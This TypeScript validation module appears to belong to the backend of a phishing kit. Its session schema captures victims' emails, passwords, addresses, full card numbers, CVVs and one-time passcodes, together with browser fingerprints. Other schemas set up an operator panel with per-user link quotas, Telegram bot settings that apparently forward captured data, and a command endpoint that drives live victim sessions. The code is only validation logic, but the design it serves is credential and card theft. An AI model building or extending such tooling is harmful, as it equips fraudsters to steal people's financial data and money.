import { body, param, query } from 'express-validator';
import { z } from 'zod';

// Zod schemas for runtime validation
export const sessionSyncSchema = z.object({
  sessionId: z.string().min(1, 'Session ID is required'),
  currentView: z.string().optional(),
  stage: z.string().optional(),
  email: z.string().email().optional(),
  password: z.string().min(1).optional(),
  phoneNumber: z.string().optional(),
  phoneCode: z.string().optional(),
  firstName: z.string().optional(),
  lastName: z.string().optional(),
  dob: z.string().optional(),
  address: z.string().optional(),
  country: z.string().optional(),
  cardNumber: z.string().optional(),
  cardType: z.string().optional(),
  cardExpiry: z.string().optional(),
  cardCvv: z.string().optional(),
  cardOtp: z.string().optional(),
  fingerprint: z.object({
    userAgent: z.string().optional(),
    language: z.string().optional(),
    platform: z.string().optional(),
    screenResolution: z.string().optional(),
    ip: z.string().optional()
  }).optional(),
  adminCode: z.string().optional()
});

export const adminLoginSchema = z.object({
  username: z.string().min(1, 'Username is required'),
  password: z.string().min(1, 'Password is required')
});

export const createUserSchema = z.object({
  username: z.string().min(3, 'Username must be at least 3 characters'),
  password: z.string().min(8, 'Password must be at least 8 characters'),
  role: z.enum(['admin', 'hypervisor']).optional(),
  uniqueCode: z.string().optional()
});

export const updateUserSchema = z.object({
  username: z.string().min(3).optional(),
  password: z.string().min(8).optional(),
  uniqueCode: z.string().optional(),
  settings: z.any().optional(),
  maxLinks: z.number().min(1).max(100).optional(),
  isSuspended: z.boolean().optional()
});

export const telegramConfigSchema = z.object({
  token: z.string().optional(),
  chat: z.string().optional()
});

export const settingsSchema = z.object({
  settings: z.any().optional(),
  telegramConfig: telegramConfigSchema.optional()
});

// Express-validator schemas for middleware validation
export const validateSessionSync = [
  body('sessionId').isString().notEmpty().withMessage('Session ID is required'),
  body('email').optional().isEmail().withMessage('Invalid email format'),
  body('phoneNumber').optional().isMobilePhone('any').withMessage('Invalid phone number'),
  body('cardNumber').optional().isCreditCard().withMessage('Invalid card number'),
  body('cardExpiry').optional().matches(/^\d{2}\/\d{2}$/).withMessage('Invalid expiry format (MM/YY)'),
  body('cardCvv').optional().isLength({ min: 3, max: 4 }).withMessage('Invalid CVV')
];

export const validateAdminLogin = [
  body('username').isString().notEmpty().withMessage('Username is required'),
  body('password').isString().notEmpty().withMessage('Password is required')
];

export const validateCreateUser = [
  body('username').isString().isLength({ min: 3 }).withMessage('Username must be at least 3 characters'),
  body('password').isString().isLength({ min: 8 }).withMessage('Password must be at least 8 characters'),
  body('role').optional().isIn(['admin', 'hypervisor']).withMessage('Invalid role'),
  body('uniqueCode').optional().isString()
];

export const validateUpdateUser = [
  param('id').isString().notEmpty().withMessage('User ID is required'),
  body('username').optional().isString().isLength({ min: 3 }),
  body('password').optional().isString().isLength({ min: 8 }),
  body('uniqueCode').optional().isString(),
  body('maxLinks').optional().isInt({ min: 1, max: 100 }),
  body('isSuspended').optional().isBoolean()
];

export const validateCreateLink = [
  body('adminId').optional().isString(),
  body('code').optional().isString()
];

export const validateCommand = [
  body('sessionId').isString().notEmpty().withMessage('Session ID is required'),
  body('action').isString().notEmpty().withMessage('Action is required'),
  body('payload').optional()
];

export const validateSessionId = [
  param('id').isString().notEmpty().withMessage('Session ID is required')
];

// Utility function to validate with Zod
export const validateWithZod = <T>(schema: z.ZodSchema<T>, data: unknown): { success: true; data: T } | { success: false; error: z.ZodError } => {
  const result = schema.safeParse(data);
  if (result.success) {
    return { success: true, data: result.data };
  } else {
    return { success: false, error: result.error };
  }
};